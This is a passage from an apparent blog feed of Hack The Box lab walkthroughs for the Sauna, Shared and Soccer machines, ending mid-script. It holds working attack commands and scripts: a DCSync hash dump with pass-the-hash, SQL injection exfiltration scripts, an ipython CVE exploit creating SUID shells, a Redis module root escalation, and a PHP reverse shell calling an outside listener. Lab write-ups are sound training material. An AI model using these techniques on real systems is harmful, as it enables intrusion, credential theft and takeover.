+&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\Temp&amp;gt; upload winPEASx64.exe 
+                                        
+Info: Uploading /home/mhil4ne/Downloads/winPEASx64.exe to C:\Temp\winPEASx64.exe
+                                        
+Data: 3183272 bytes of 3183272 bytes copied
+                                        
+Info: Upload successful
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We get a lot of output from this but one section sticks outs particularly, the AutoLogon A service account has an auto logon enabled and we can harvest svc_loanmgr:Moneymakestheworldgoround! as valid credentials.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We can try those credentials with Evil-Winrm and we get in&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; evil-winrm -u svc_loanmgr -i 10.10.10.175 -p Moneymakestheworldgoround!
+
+*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Get Administrator&lt;/h3&gt;
+&lt;p&gt;With these credentials, we can run a tool called Bloodhound. It is a tool that finds hidden relationships within Active Directory. It can often lead to some quick privilege escalation. There is a python and impacket version of it that I’ll be using for Sauna.&lt;/p&gt;
+&lt;p&gt;installing is very easy.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo pip install bloodhound
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then we can run the command:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c All
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;To start the attack. it created a lot .json files that that we will import into bloodhound.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; ls
+20240218112738_computers.json    20240218112738_domains.json   20240218112738_groups.json   20240218112738_users.json
+20240218112738_containers.json   20240218112738_gpos.json      20240218112738_ous.json
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;to start the bloodhound console i ran neo4j console then bloodhound in the console. Next, we will upload our files by clicking the upload button on the right.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;After importing our files we can select “Find Principals with DCSync Rights” and it generates a graph. Our service account has two permissions. Notice its similar permissions of administrators.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;GetChanges&lt;/li&gt;
+&lt;li&gt;GetChangesAll&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&quot;./img/4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;I right-clicked the relation and selected “Help”. Under the Abuse info,m I learned that we can perform a dcsync attack to get password hashes.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Impacket has a tool called secretsdump.py we can use to leverage this.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python3 secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 -just-dc-user Administrator 
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
+Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
+Administrator:des-cbc-md5:fb8f321c64cea87f
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now we have the admins Hash. We can use it in a pass the hash attack.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt; evil-winrm -u Administrator -i 10.10.10.175 -H 823452073d75b9d1cf70ebdf86c7f98e
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;we are administrator.&lt;/p&gt;
+</content:encoded></item><item><title>Shared HTB Writeup</title><link>https://fuwari.vercel.app/posts/shared/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/shared/</guid><description>Medium Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Shared is a medium Linux machine created by Nauten on Hack The Box that features a website with a virtual hostname that is vulnerable to SQL injection. Successful exploitation of this vulnerability provides us with the password for a user called james_mason. With these credentials we are able to login via SSH and elevate privileges to a user called dan_smith by exploiting a cron job that uses a version of ipython that is vulnerable to CVE-2022-21699. We then reverse-engineer an executable using both static and dynamic analysis to recover the password for the local Redis service. The Redis process is running as root, so we load a special shared object module using LOAD MODULE to execute commands as root.&lt;/p&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;Let’s first set up our environment and run a TCP port scan with this custom nmap wrapper.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Mhil4ne@Kali
+export rhost=&quot;10.10.10.x&quot;
+sudo nmap -sS -p- --open --min-rate 3000 -n -Pn -vvv  $rhost -oG nmap
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The scan reports that the SSH service, HTTP service, and HTTPS service are running on ports 22, 80, and 443 respectively&lt;/p&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;Upon visiting port 80, we are redirected to shared.htb. Let’s add this hostname to our /etc/hosts{:.filepath} file with the corresponding IP address.&lt;/p&gt;
+&lt;p&gt;Now we’ll visit https://shared.htb/ in a browser session being proxied through the BurpSuite HTTP proxy.&lt;/p&gt;
+&lt;p&gt;Index page
+shared.htb web index page&lt;/p&gt;
+&lt;h3&gt;Walking the Application&lt;/h3&gt;
+&lt;p&gt;When exploring the content of the website, we eventually discover the checkout page at /index.php?controller=cart&amp;amp;action=show. When we hover over the checkout button, we can see that it will send us to https://checkout.shared.htb. Let’s add this virtual hostname to our /etc/hosts{:.filepath} file so we can view its content.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo sed -E -i &apos;s/(shared.htb).*/\1 checkout.\1/&apos; /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now when we add an item to our cart and navigate to /index.php?controller=cart&amp;amp;action=show, we’ll click the checkout button to be redirected to the checkout site.&lt;/p&gt;
+&lt;h3&gt;Investigating Functionality&lt;/h3&gt;
+&lt;p&gt;It’s interesting how this site is able to determine which item we had in our cart considering we did not supply any HTTP GET or POST parameters. Let’s investigate.&lt;/p&gt;
+&lt;p&gt;Looking at the initial request we sent to the checkout site in the BurpSuite site map, we can see that our request contains an unusual cookie called custom_cart. The value of this cookie can be automatically decoded by highlighting it, revealing a JSON object with the product code and quantity of the checkout item.&lt;/p&gt;
+&lt;p&gt;We find a mysterious cookie in BurpSuite&lt;/p&gt;
+&lt;p&gt;We can infer that the site uses the supplied product code in custom_cart to find the price of the item since we do not supply the price, but only the product code. This activity is likely handled by some type of database solution such as an SQL server. With this in mind, we can check if this functionality is vulnerable to SQL injection.&lt;/p&gt;
+&lt;h3&gt;Vulnerability Discovery&lt;/h3&gt;
+&lt;p&gt;Let’s input some basic SQL injection payloads to the cookie in the BurpSuite repeater tab to see if SQL injection is possible.&lt;/p&gt;
+&lt;p&gt;The server’s response to a common SQL injection payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{&quot;CRAAFTKP&apos;#&quot;:&quot;1&quot;}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The response to the first payload suggests that SQL injection is possible but we can make sure by sending a payload that should evaluate to false, and one that should be true.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
+
+from urllib.parse import quote
+from sys import argv
+
+if len(argv) == 2:
+        sqli = argv[1]
+        sqli = sqli.replace(&apos;\\&apos;, &apos;\\\\&apos;)
+        sqli = sqli.replace(&apos;&quot;&apos;,&apos;\\&quot;&apos;)
+        print(quote(&apos;{&quot;&apos; + argv[1] + &apos;&quot;:&quot;1&quot;}&apos;))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;chmod +x makepayload.py
+true=$(./makepayload.py &quot;&apos; OR 1=1#&quot;) # Always resolves to true
+false=$(./makepayload.py &quot;&apos; AND 1=2#&quot;) # Always resolves to false
+
+url=&quot;https://checkout.shared.htb&quot;
+curl -k -s $url -b &quot;custom_cart=$true&quot; | sed &apos;s/^ *//&apos; &amp;gt; true.html
+curl -k -s $url -b &quot;custom_cart=$false&quot; | sed &apos;s/^ *//&apos; &amp;gt; false.html
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This should leave you with two files called false.html{:.filepath} and true.html{:.filepath}. To find the difference between the two response bodies we can use diff.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;diff false.html true.html
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;37,39c37,39
+&amp;lt; &amp;lt;td&amp;gt;Not Found&amp;lt;/td&amp;gt;
+&amp;lt; &amp;lt;td&amp;gt;0&amp;lt;/td&amp;gt;
+&amp;lt; &amp;lt;td&amp;gt;$0,00&amp;lt;/td&amp;gt;
+---
+&amp;gt; &amp;lt;td&amp;gt;53GG2EF8&amp;lt;/td&amp;gt;
+&amp;gt; &amp;lt;td&amp;gt;1&amp;lt;/td&amp;gt;
+&amp;gt; &amp;lt;td&amp;gt;$23,90&amp;lt;/td&amp;gt;
+45c45
+&amp;lt; &amp;lt;th scope=&quot;col&quot;&amp;gt;$0,00&amp;lt;/th&amp;gt;
+---
+&amp;gt; &amp;lt;th scope=&quot;col&quot;&amp;gt;$23,90&amp;lt;/th&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The false query returns “Not Found” and zero values for the quantity and price while the true query returns a product entry. This is definitely enough evidence of an SQL injection vulnerability to begin exploitation.&lt;/p&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web Exploitation&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;We have already determined that boolean-based blind SQL injection is possible with the true and false queries, but there is a good chance we can use UNION SELECT queries to exfiltrate database values without having to use a side-channel.&lt;/p&gt;
+&lt;h3&gt;Union Query Exfiltration&lt;/h3&gt;
+&lt;p&gt;Let’s first find the number of columns in the original query so we can match it in our UNION SELECT extension.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;payload=$(./makepayload.py &quot;&apos; UNION SELECT &apos;c0lumn1&apos;,&apos;c0lumn2&apos;,&apos;c0lumn3&apos;#&quot;)
+
+curl -k -s &quot;https://checkout.shared.htb&quot; -b &quot;custom_cart=$payload&quot; | \
+	sed &apos;s/^ *//&apos; |
+	egrep &apos;&amp;lt;/?td&amp;gt;&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;td&amp;gt;c0lumn2&amp;lt;/td&amp;gt;
+&amp;lt;td&amp;gt;1&amp;lt;/td&amp;gt;
+&amp;lt;td&amp;gt;$&amp;lt;/td&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Notice how the response contains the value we sent in the second column. This means we can extract data through the second column. Now let’s create a script to get any raw value from the database.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/bin/bash
+
+[ -z &quot;$SELECT&quot; ] &amp;amp;&amp;amp; echo &quot;SELECT=* FROM=* WHERE=* $0&quot; &amp;amp;&amp;amp; exit
+
+payload=&quot;&apos; UNION SELECT &apos;&apos;,$SELECT,&apos;&apos;&quot;
+
+[ -z &quot;$FROM&quot; ] || payload=&quot;$payload FROM $FROM&quot;
+[ -z &quot;$WHERE&quot; ] || payload=&quot;$payload WHERE $WHERE&quot; 
+
+echo $payload
+
+payload=$(./makepayload.py &quot;$payload#&quot;)
+
+curl -k -s &quot;https://checkout.shared.htb&quot; -b &quot;custom_cart=$payload&quot; |
+	egrep &apos;&amp;lt;/?td&amp;gt;&apos; |
+	head -1 |
+	sed -E &apos;s/^ *&amp;lt;td&amp;gt;(.*)&amp;lt;\/td&amp;gt;$/\1/&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then we can see if we can get the available database names. Remember that this database is probably MySQL because the # comment is working.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;chmod +x sqli.sh
+SELECT=&quot;group_concat(schema_name)&quot;   \
+FROM=&quot;information_schema.schemata&quot;   \
+	./sqli.sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;information_schema,checkout
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;There is a database called checkout that we should explore. Let’s find the names of its tables.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;SELECT=&quot;group_concat(table_name)&quot;   \
+FROM=&quot;information_schema.tables&quot;    \
+WHERE=&quot;table_schema=&apos;checkout&apos;&quot;     \
+	./sqli.sh
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;user,product
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The user table seems interesting. Let’s find the column names and dump the table contents.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;SELECT=&quot;group_concat(column_name)&quot;   \
+FROM=&quot;information_schema.columns&quot;    \
+WHERE=&quot;table_name=&apos;user&apos;&quot;            \
+	./sqli.sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;id,username,password
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;SELECT=&quot;group_concat(concat(id,0x7c,username,0x7c,password))&quot; \
+FROM=&quot;checkout.user&quot; \
+	./sqli.sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;1|james_mason|[REDACTED]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;There is only one result, but we got what looks like an MD5 hash in the password column for the user james_mason.&lt;/p&gt;
+&lt;h3&gt;Shell as james_mason&lt;/h3&gt;
+&lt;p&gt;Let’s try to crack the hash using John the Ripper&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# mhil4ne@kali
+hash=&quot;&quot; # Hash here
+echo &quot;james_mason:$hash&quot; &amp;gt; md5.john
+john md5.john \
+	--format=&quot;raw-md5&quot; \
+	--wordlist=&quot;rockyou.txt&quot; # classic rockyou.txt wordlist
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Using these credentials on the target’s SSH server will land us a shell as james_mason.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# mhil4ne@kali
+ssh &quot;james_mason@$rhost&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;There is no user flag in our home directory so we might need to do some lateral movement.&lt;/p&gt;
+&lt;h3&gt;Lateral Movement&lt;/h3&gt;
+&lt;p&gt;We will be using LinPEAS from PEASS-ng to look for any useful information on the machine. We will also be using pspy to snoop on processes.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# mhil4ne@kali
+lhost=&quot;10.10.14.10&quot; # Listener host
+cd $(mktemp -d)
+wget \
+	&quot;https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64&quot; \
+	&quot;https://github.com/carlospolop/PEASS-ng/releases/download/20220522/linpeas.sh&quot;
+php -S $lhost:80
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;# james_mason@shared.htb (SSH)
+lhost=&quot;10.10.14.10&quot; # Attacker&apos;s IP address
+mkdir .sneak &amp;amp;&amp;amp; cd .sneak
+wget &quot;http://$lhost/pspy64&quot; &quot;http://$lhost/linpeas.sh&quot;
+bash ./linpeas.sh | tee linpeas.log
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We don’t get anything that blatantly stands out in the LinPEAS output. Let’s try running PSpy for a few minutes.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# james_mason@shared.htb (SSH)
+chmod +x pspy64
+timeout 3m ./pspy64 | tee pspy.log
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Looking at the output, user ID 0 and user ID 1001 seem to be running routine commands. UID 0 is root and User ID 1001 turns out to be user dan_smith, declared in /etc/passwd{:.filepath}. It can be noted that dan_smith runs an interesting command every minute.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ &amp;amp;&amp;amp; /usr/local/bin/ipython
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The user enters the /opt/scripts_review{:.filepath} directory and executes /usr/local/bin/ipython{:.filepath}.&lt;/p&gt;
+&lt;h3&gt;CVE-2022-21699&lt;/h3&gt;
+&lt;p&gt;After doing some research into ipython, we come across a vulnerability advisory that details a code execution flaw.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;We’d like to disclose an arbitrary code execution vulnerability in IPython that stems from IPython executing untrusted files in CWD. This vulnerability allows one user to run code as another.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Let’s check if the version on the machine is vulnerable.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# james_mason@shared.htb (SSH)
+/usr/local/bin/ipython --version
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The version is 8.0.0, which is vulnerable. Since the routine command executed by dan_smith is run in the /opt/scripts_review{:.filepath} directory, we could exploit the vulnerability if /opt/scripts_review{:.filepath} is writable.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# james_mason@shared.htb (SSH)
+ls -la /opt/scripts_review
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It is writable by those in the developer group. According to the output of the id command, our current user is actually part of this group.&lt;/p&gt;
+&lt;h3&gt;Exploitation&lt;/h3&gt;
+&lt;p&gt;Let’s test our hypothesis by following the instructions in the advisory to execute code as dan_smith.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/bin/bash
+
+exploitdir=&quot;/opt/scripts_review&quot;
+cmd=&quot;cp /bin/sh /tmp/dan_smith_sh;chmod a+xs /tmp/dan_smith_sh&quot;
+
+mkdir -m 777 &quot;$exploitdir/profile_default&quot;
+mkdir -m 777 &quot;$exploitdir/profile_default/startup&quot;
+echo &quot;__import__(&apos;os&apos;).popen(&apos;$cmd&apos;)&quot; &amp;gt; &quot;$exploitdir/profile_default/startup/x.py&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;After running the script and waiting a minute, our SUID shell should be at /tmp/dan_smith_sh{:.filepath}.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# james_mason@shared.htb (SSH)
+/tmp/dan_smith_sh -p
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation &amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;The first flag is located at /home/dan_smith/user.txt{:.filepath}&lt;/p&gt;
+&lt;h3&gt;Stabilizing Shell&lt;/h3&gt;
+&lt;p&gt;Let’s copy the contents of /home/dan_smith/.ssh/id_rsa{:.filepath} over to the attacker machine and use it to log in as dan_smith via SSH to get a more stable shell.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# mhil4ne@kali
+chmod 600 dan_smith_id_rsa
+ssh -i dan_smith_id_rsa &quot;dan_smith@$rhost&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;When running the id command, we learn that our current user is part of the sysadmin group. Let’s see what this group has special access to.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# dan_smith@shared.htb (SSH)
+find / -group sysadmin 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;/usr/local/bin/redis_connector_dev
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;One file at /usr/local/bin/redis_connector_dev{:.filepath} is returned. This file probably has something to do with a key-value data storage solution known as Redis. When we execute /usr/local/bin/redis_connector_dev{:.filepath}, it prints a log message saying “Logging to redis instance using password” and what looks like the output of the INFO Server redis query.&lt;/p&gt;
+&lt;h3&gt;Redis&lt;/h3&gt;
+&lt;p&gt;Let’s gather some basic info on the file and see what’s going on behind the scenes.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# dan_smith@shared.htb (SSH)
+file /usr/local/bin/redis_connector_dev|tr &apos;,&apos; &apos;\n&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Based on the output of the file command, we can note a few things about the file:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;It is an ELF x86-64 executable&lt;/li&gt;
+&lt;li&gt;it was built with a Go compiler (hence the Go BuildID)&lt;/li&gt;
+&lt;li&gt;It is not stripped&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Since the Redis RESP protocol operates in plaintext, we might be able to capture the password. First, let’s copy the file to the attacker machine.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# mhil4ne@kali
+scp -i dan_smith_id_rsa &quot;dan_smith@$rhost:/usr/local/bin/redis_connector_dev&quot; .
+chmod +x redis_connector_dev
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Running the file on the attacker machine, we get an error complaining that TCP port 6379 is closed on the loopback address. We can open that port by running nc in a separate tab.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# mhil4ne@kali
+nc -lv 127.0.0.1 6379
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now if we run ./redis_connector_dev{:.filepath} we get some output to the listener.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Connection received on localhost 35468
+*2
+$4
+auth
+$16
+[REDACTED]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The strings auth and [REDACTED] are passed. Given the circumstances, the second string seems like it may be the password so let’s try using that with the redis-cli command back on the target machine.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# dan_smith@shared.htb (SSH)
+redis-cli -a &quot;$password&quot; INFO server
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The INFO server command is successfully executed. While running some extra enumeration commands we find out that the redis store is pretty much empty.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# dan_smith@shared.htb (SSH)
+redis-cli -a &quot;$password&quot; INFO keyspace
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;After some research on redis, we come across this page which presents different methods of achieving RCE on a redis server. This is useful for us because the user running the redis server is root meaning we will execute commands as root if RCE is possible.&lt;/p&gt;
+&lt;p&gt;One method is to load a special shared object file using MODULE LOAD query. We can build the shared object from this source code on the attacker machine, then copy module.so{:.filepath} to the target.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# james_mason@shared.htb (SSH)
+command=&quot;cp /bin/sh /root_sh;chmod a+xs /root_sh&quot;
+redis-cli -a &quot;$password&quot; MODULE LOAD ~/module.so &amp;amp;&amp;amp;
+	redis-cli -a &quot;$password&quot; system.exec &quot;$command&quot;
+/root_sh -p
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Running this should land us a shell as root where the last flag can be found at /root/root.txt{:.filepath}&lt;/p&gt;
+</content:encoded></item><item><title>Soccer HTB Writeup</title><link>https://fuwari.vercel.app/posts/soccer/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/soccer/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;We check the connection with the victim machine:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ ping -c 1 10.10.11.194
+PING 10.10.11.194 (10.10.11.194) 56(84) bytes of data.
+64 bytes from 10.10.11.194: icmp_seq=1 ttl=63 time=81.0 ms
+
+--- 10.10.11.194 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 81.018/81.018/81.018/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let’s run our scan with nmap:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ nmap 10.10.11.194
+Nmap scan report for 10.10.11.194
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+9091/tcp open  xmltec-xmlmail
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We have 3 open ports on the machine, in which we can find 3 services.&lt;/p&gt;
+&lt;p&gt;The first thing we are going to do is check port 80.&lt;/p&gt;
+&lt;p&gt;By looking at the “Location” header when we make a curl request, we can see the domain.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ curl -s 10.10.11.194 -I | grep Location
+Location: http://soccer.htb/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We add the address of this website to our /etc/hosts file.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ echo &quot;10.10.11.194 soccer.htb&quot; | sudo tee -a /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr /&gt;
+&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
+&lt;p&gt;Now we can access the website.&lt;/p&gt;
+&lt;p&gt;We use gobuster to list directories.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ gobuster dir -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100
+===============================================================
+[+] Url:                     http://soccer.htb
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/tiny                 (Status: 301) [Size: 178] [--&amp;gt; http://soccer.htb/tiny/]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;found a subdomain: http://soccer.htb/tiny/&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We find a file manager with a login.&lt;/p&gt;
+&lt;p&gt;Search default credentials on the internet:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Username: admin
+Password: admin@123
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;With this we get access to the file manager. We can see the web files and the “tiny” directory.&lt;/p&gt;
+&lt;p&gt;We can also see that we can upload files in this button that appears at the top of the page.&lt;/p&gt;
+&lt;p&gt;You can see that the page is made in PHP, so we are going to try to send a ReverseShell in PHP code.&lt;/p&gt;
+&lt;h3&gt;shell.php&lt;/h3&gt;
+&lt;p&gt;Create a file you can call “shell.php” in which you write the command to be executed on the victim machine.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    system(&quot;bash -c &apos;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.85/443 0&amp;gt;&amp;amp;1&apos;&quot;)
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Here I share a reverse shell generator, Rev Shell&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;After creating our file, we upload it to the file manager.&lt;/p&gt;
+&lt;h3&gt;Netcat&lt;/h3&gt;
+&lt;p&gt;We listen on port 443.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ sudo netcat -lvnp 443
+[sudo] password for mhil4ne: 
+listening on [any] 443 ...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We call our shell.php:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ curl soccer.htb/tiny/uploads/shell.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I already have a shell like www-data&lt;/p&gt;
+&lt;h3&gt;Python Exploit&lt;/h3&gt;
+&lt;p&gt;Let’s do a SQL injection.&lt;/p&gt;
+&lt;p&gt;I found an exploit written in Python for this, we modified a few lines of code to adapt it to the victim machine:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from http.server import SimpleHTTPRequestHandler
+from socketserver import TCPServer
+from urllib.parse import unquote, urlparse
+from websocket import create_connection
+
+ws_server = &quot;ws://soccer.htb:9091/&quot;
+
+def send_ws(payload):
+	ws = create_connection(ws_server)
+	
+	message = unquote(payload).replace(&apos;&quot;&apos;,&apos;\&apos;&apos;)
+	data = &apos;{&quot;id&quot;:&quot;%s&quot;}&apos; % message
+
+	ws.send(data)
+	resp = ws.recv()
+	ws.close()
+
+	if resp:
+		return resp
+	else:
+		return &apos;&apos;
+
+def middleware_server(host_port,content_type=&quot;text/plain&quot;):
+
+	class CustomHandler(SimpleHTTPRequestHandler):
+		def do_GET(self) -&amp;gt; None:
+			self.send_response(200)
+			try:
+				payload = urlparse(self.path).query.split(&apos;=&apos;,1)[1]
+			except IndexError:
+				payload = False
+				
+			if payload:
+				content = send_ws(payload)
+			else:
+				content = &apos;No parameters specified!&apos;
+
+			self.send_header(&quot;Content-type&quot;, content_type)
+			self.end_headers()
+			self.wfile.write(content.encode())
+			return
+
+	class _TCPServer(TCPServer):
